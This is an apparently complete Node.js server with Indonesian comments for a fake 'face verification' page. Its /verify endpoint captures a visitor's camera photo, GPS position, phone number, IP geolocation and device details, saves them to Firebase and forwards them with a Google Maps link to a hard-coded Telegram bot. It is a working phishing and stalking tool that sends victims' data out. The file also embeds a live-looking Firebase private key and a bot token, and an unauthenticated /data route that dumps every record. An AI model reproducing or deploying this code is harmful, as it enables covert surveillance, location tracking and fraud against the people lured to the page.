const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');
const admin = require('firebase-admin');
const { execSync } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// ⏰ SYNC WAKTU SERVER (FIX FIREBASE ERROR)
// ============================================
try {
  console.log('⏰ Syncing server time...');
  const dateStr = execSync('curl -s --head google.com | grep -i "^date:" | cut -d" " -f2-').toString().trim();
  if (dateStr) {
    execSync(`date -s "${dateStr}"`, { stdio: 'ignore' });
    console.log('✅ Server time synced successfully!');
  }
} catch (e) {
  console.log('⚠️ Could not sync time, continuing...');
}

// ============================================
// 🔥 FIREBASE SERVICE ACCOUNT (BARU - GENERATE ULANG)
// ============================================
const serviceAccount = {
  "type": "service_account",
  "project_id": "nampung",
  "private_key_id": "23756c5a6da23e322e4bb09a48d7f2d02b8c2bcf",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCZHg0pEoILLgTH\nbAA2J2p3VvLre+C5sB1zZHCh7ZHjW03vl5xMm97DJ0q6UKjn0pTE8+sxGVDkVHG7\nKUL0jEiDlvr+VjmoRi3SvJtQrN1kghk3qrI1i6eaEzi7GfLHNQIZ+ox5d3U5EZOy\nykBEMdKxQpeLWMkZxLRrbAQLCzc6hPdHljThYCgrZcDumWLAy+ayeI1SXZI9jiiR\ne8uKvCUEYHN28P1nxQIIvcF79+vduldl9djIN29SGLoTFMScAVc+fHWj7uwcQaMm\nsvV0AtOgLZwoOFsQvXaZMIfyuhsuSareO4r2PNgxcRHIiIe4HAPPWv4+TU5J5K3P\nT1vQnh9hAgMBAAECggEAIY0++4LJebssA2nkUvmIoB1urhCvUekoTu6Rqr3046HQ\nfmGVt4jJQ7CytIhztpbDkDPV0+S0/8+MO2OjfxRVWHZnSf+pczjrlhvLmd5DRiCm\n93aBRe/z+jRfkEozk5jHPNuU2BIH3wk9uOYONpNHVJ3fuMJsEKg0k7xv116uC7Wb\n9DQ+dwin8q6J82osE3RFvO8w84fQHR9EPoImFgrgcij29XQ0GpCpdqNEC20bjyAB\nF3Os+DITKwa8AQ09CXUsACHieQugPCZlv99sYZDcSfIDysiFFdu8r/XjxCoLkFKY\nXlbr38igN7Lqz2RSWrtKzdBqnIORn0NQnbN0OzwnBQKBgQDJ2dSkLp7vNLy0CPeF\nVIziauXF1RKLZXyiFp4feNdVovId4lFmkG1mbdNyhJ5v2fI/OSzJixauai2Nu0G8\nzs6jPTyZwXP6GCdGd9BRFgU5HJaCr83gPP/VX6fYdkASyqIhpn6W5uTFJrcIfg5K\njuE0SQn+0+B0tJwHGp/4eTSV7QKBgQDCMW6/9JlIabdnFyAAAPTXnKfJA5sHZdWz\n0QAX2oaX7ldSot5EBQERuMU1YuuIGxalnDDi2nndksk+oLiPqoo1hXlfstQgLUwf\nJo8+7ASVzo7dKtkM2FWN3uYa4DJANwOuedr6YnfoZTu0gxrlB++2RGv4aCB4brRG\njNL4funAxQKBgERaeLC0fOvCLxjEZJWJAUB3NKIeum3sCx2UjS1ZLYp5aIYIKsqR\npAporI7+K+zyoB8azHjfmemsWQrC28sFOWJ8DTaAFTce0MYDMs8SpuglLy7IO+5w\nma32+47I1H/IkMjWac3OGLBOoPLGRS6oXcjn5vOdakf7FU8ui/eHi/AtAoGAR9x7\nG1Wsk3trfx6znMy9zjwOaviGmgo5Nr2Uxz76p6ZvcgkLLyia6K/zanocptU/YDGY\ndZpbln8HMcHQCnoVgxDNhXhrvyyECtL+F07Hs5gojfeZMoOrxUBC7pcggVraZep5\n+kYOEVXE7lvFzBNPxac0PUxrF6X/2EusloCAh/ECgYBrJ7ojIEtsQhxX8I9KqJcY\nIrDCVvkvpPbNdtjwybn0HtUm1z+E4W549JKCHxaZb3cTmGYBh47vo7K/nLMfDig8\nozs+iaeGcJPZtJJH57SoMPVFMDtZyRPgi2DASk8QcIgqOVIE5VXPPdDp+FXJC325\nvb79c90/chOibIt73bi5uA==\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fbsvc@nampung.iam.gserviceaccount.com",
  "client_id": "105465652603290327209",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40nampung.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
};

// ============================================
// 🔥 INIT FIREBASE
// ============================================
let database;
let verifikasiRef;

try {
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: 'https://nampung-default-rtdb.asia-southeast1.firebasedatabase.app/'
  });
  database = admin.database();
  verifikasiRef = database.ref('verifikasi');
  console.log('🔥 Firebase connected successfully!');
} catch (err) {
  console.error('❌ Firebase init error:', err.message);
  process.exit(1);
}

// ============================================
// 🤖 TELEGRAM CONFIG
// ============================================
const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = '7352381955';

console.log('========================================');
console.log('🚀 SERVER STARTING');
console.log('========================================');
console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
console.log('========================================');

// ============================================
// 📦 MIDDLEWARE
// ============================================
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// ============================================
// 📍 GET LOCATION FROM IP
// ============================================
async function getLocationDetails(ip) {
  try {
    const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
    if (!cleanIp) return null;
    
    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting`);
    const data = await res.json();
    
    if (data.status === 'success') {
      return {
        ip: data.query,
        country: data.country || '-',
        countryCode: data.countryCode || '-',
        region: data.regionName || '-',
        city: data.city || '-',
        zip: data.zip || '-',
        latitude: data.lat || 0,
        longitude: data.lon || 0,
        timezone: data.timezone || '-',
        provider: data.isp ? data.isp.replace('PT ', '') : '-',
        isMobile: data.mobile || false,
        fullLocation: `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`,
        googleMapsLink: `https://www.google.com/maps?q=${data.lat || 0},${data.lon || 0}`
      };
    }
    return null;
  } catch (e) {
    console.error('Geolocation error:', e.message);
    return null;
  }
}

// ============================================
// 📱 DETECT DEVICE
// ============================================
function detectDevice(userAgent) {
  if (!userAgent) return { browser: 'Tidak diketahui', os: 'Tidak diketahui', device: 'Tidak diketahui', brand: 'Tidak diketahui', model: 'Tidak diketahui' };
  
  const ua = userAgent.toLowerCase();
  const info = {
    browser: 'Tidak diketahui',
    os: 'Tidak diketahui',
    device: 'Tidak diketahui',
    brand: 'Tidak diketahui',
    model: 'Tidak diketahui'
  };

  if (ua.includes('chrome')) info.browser = 'Chrome';
  else if (ua.includes('firefox')) info.browser = 'Firefox';
  else if (ua.includes('safari') && !ua.includes('chrome')) info.browser = 'Safari';
  else if (ua.includes('edge')) info.browser = 'Edge';

  if (ua.includes('android')) {
    info.os = 'Android';
    const match = ua.match(/android\s([\d.]+)/);
    if (match) info.os += ` ${match[1]}`;
  } else if (ua.includes('iphone') || ua.includes('ipad')) {
    info.os = 'iOS';
    const match = ua.match(/os\s([\d_]+)/);
    if (match) info.os += ` ${match[1].replace(/_/g, '.')}`;
  } else if (ua.includes('windows')) {
    info.os = 'Windows';
  } else if (ua.includes('mac')) {
    info.os = 'macOS';
  }

  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
    info.device = 'Mobile';
  } else if (ua.includes('tablet') || ua.includes('ipad')) {
    info.device = 'Tablet';
  } else {
    info.device = 'Desktop';
  }

  const brands = [
    { name: 'Samsung', patterns: ['samsung', 'sm-'] },
    { name: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco'] },
    { name: 'Realme', patterns: ['realme'] },
    { name: 'Oppo', patterns: ['oppo'] },
    { name: 'Vivo', patterns: ['vivo'] },
    { name: 'OnePlus', patterns: ['oneplus'] },
    { name: 'Google Pixel', patterns: ['pixel'] },
    { name: 'Huawei', patterns: ['huawei', 'honor'] },
    { name: 'Apple', patterns: ['iphone', 'ipad'] }
  ];

  for (const brand of brands) {
    if (brand.patterns.some(p => ua.includes(p))) {
      info.brand = brand.name;
      break;
    }
  }

  if (info.brand === 'Apple') {
    const match = ua.match(/iphone(\d+)/);
    if (match) info.model = `iPhone ${match[1]}`;
  } else if (info.brand === 'Samsung') {
    const match = ua.match(/sm-[a-z0-9]+/i);
    if (match) info.model = match[0].toUpperCase();
  }

  return info;
}

// ============================================
// 📤 SEND TO TELEGRAM
// ============================================
async function sendToTelegram(photoBuffer, data) {
  try {
    const { device, gps, locationData, ip, timestamp, phone } = data;
    const time = new Date(timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    
    let caption = `🟡 *VERIFIKASI WAJAH*\n\n`;
    caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
    caption += `🕒 *Waktu:* ${time}\n\n`;
    
    if (device) {
      caption += `📱 *Device Info:*\n`;
      caption += `   🏷️ Brand: ${device.brand || 'Tidak diketahui'}\n`;
      if (device.model && device.model !== 'Tidak diketahui') {
        caption += `   📟 Model: ${device.model}\n`;
      }
      caption += `   📱 Tipe: ${device.device || 'Tidak diketahui'}\n`;
      caption += `   💻 OS: ${device.os || 'Tidak diketahui'}\n`;
      caption += `   🌐 Browser: ${device.browser || 'Tidak diketahui'}\n\n`;
    }
    
    if (locationData) {
      caption += `📍 *Lokasi:*\n`;
      caption += `   🏙️ ${locationData.fullLocation}\n`;
      caption += `   📮 Zip: ${locationData.zip}\n`;
      caption += `   🌐 Timezone: ${locationData.timezone}\n`;
      caption += `   📡 Provider: ${locationData.provider}\n\n`;
      caption += `🗺️ *Google Maps:*\n`;
      caption += `${locationData.googleMapsLink}\n\n`;
      caption += `📊 *Koordinat:*\n`;
      caption += `   ${locationData.latitude}, ${locationData.longitude}\n\n`;
    }
    
    if (gps) {
      caption += `📍 *GPS:*\n`;
      caption += `   ${gps.latitude}, ${gps.longitude}\n`;
      caption += `   🎯 Akurasi: ${gps.accuracy ? Math.round(gps.accuracy) + 'm' : 'Tidak diketahui'}\n\n`;
    }
    
    caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
    caption += `_Foto diterima untuk verifikasi_`;

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', caption);
    form.append('photo', photoBuffer, { 
      filename: `verifikasi_${Date.now()}.jpg`, 
      contentType: 'image/jpeg' 
    });

    const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form,
    });
    
    const tgData = await tgResponse.json();
    console.log('📨 Telegram response:', tgData.ok ? '✅ Success' : '❌ Failed');
    
    if (gps) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          latitude: gps.latitude,
          longitude: gps.longitude
        })
      });
    }
    
    return tgData;
  } catch (err) {
    console.error('Send error:', err);
    return null;
  }
}

// ============================================
// 📨 WEBHOOK BOT
// ============================================
app.post('/webhook', async (req, res) => {
  try {
    const { message } = req.body;
    console.log('📨 Webhook received');
    
    if (message && message.text === '/info') {
      const chatId = message.chat.id;
      const snapshot = await verifikasiRef.once('value');
      const allData = snapshot.val();
      
      if (!allData) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: '📭 Belum ada data verifikasi.'
          })
        });
        return res.sendStatus(200);
      }
      
      const users = Object.values(allData);
      let response = `📊 *DATA VERIFIKASI*\n\n`;
      response += `Total: ${users.length} orang\n\n`;
      
      users.forEach((user, index) => {
        const lastIndex = users.length - 1;
        response += `${index + 1}. 📱 ${user.phone || 'User'}\n`;
        response += `   🕒 ${user.timestamp || '-'}\n`;
        response += `   📍 ${user.location || 'Tidak diketahui'}\n`;
        if (index < lastIndex) response += `\n`;
      });
      
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: response,
          parse_mode: 'Markdown'
        })
      });
    }
    
    res.sendStatus(200);
  } catch (err) {
    console.error('Webhook error:', err);
    res.sendStatus(500);
  }
});

// ============================================
// ✅ VERIFY ENDPOINT
// ============================================
app.post('/verify', async (req, res) => {
  console.log('📸 ===== NEW VERIFICATION =====');
  console.log('📸 Time:', new Date().toISOString());
  
  try {
    const { image, device, gps, locationName, timestamp, phone } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || '';
    
    console.log(`🌐 IP: ${ip}`);
    console.log(`📱 GPS:`, gps ? `${gps.latitude}, ${gps.longitude}` : 'Tidak ada');
    
    if (!image) {
      return res.json({ success: false, error: 'No image' });
    }
    
    const locationData = await getLocationDetails(ip);
    const deviceData = detectDevice(userAgent);
    
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    console.log(`📸 Image size: ${buffer.length} bytes`);
    
    const userData = {
      phone: phone || `User_${Date.now().toString().slice(-6)}`,
      timestamp: new Date(timestamp || Date.now()).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
      location: locationData ? locationData.fullLocation : 'Tidak diketahui',
      ip: ip,
      device: deviceData ? `${deviceData.brand} ${deviceData.model}`.trim() || deviceData.device : 'Tidak diketahui',
      latitude: gps ? gps.latitude : (locationData ? locationData.latitude : 0),
      longitude: gps ? gps.longitude : (locationData ? locationData.longitude : 0),
      provider: locationData ? locationData.provider : '-',
      os: deviceData ? deviceData.os : '-',
      browser: deviceData ? deviceData.browser : '-'
    };
    
    console.log('💾 Saving to Firebase...');
    const newUserRef = verifikasiRef.push();
    await newUserRef.set(userData);
    console.log(`✅ Saved to Firebase with key: ${newUserRef.key}`);
    
    const result = await sendToTelegram(buffer, {
      device: deviceData,
      gps: gps,
      locationData: locationData,
      ip: ip,
      timestamp: timestamp || new Date().toISOString(),
      phone: userData.phone
    });
    
    if (result && result.ok) {
      console.log('✅ Success!');
      res.json({ success: true, firebaseKey: newUserRef.key });
    } else {
      console.log('❌ Failed to send to Telegram');
      res.json({ success: false, error: 'Telegram error' });
    }
    
  } catch (err) {
    console.error('❌ Error:', err);
    res.json({ success: false, error: err.message });
  }
});

// ============================================
// 🧪 TEST ENDPOINTS
// ============================================
app.get('/test', async (req, res) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
    const data = await response.json();
    res.json(data);
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.get('/send', async (req, res) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: '✅ Bot is working!'
      })
    });
    const data = await response.json();
    res.json(data);
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.get('/data', async (req, res) => {
  try {
    const snapshot = await verifikasiRef.once('value');
    res.json(snapshot.val());
  } catch (err) {
    res.json({ error: err.message });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================
// 🚀 START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
  console.log('========================================');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📊 Test bot: /test`);
  console.log(`📊 Test send: /send`);
  console.log(`📊 View data: /data`);
  console.log('========================================');
});
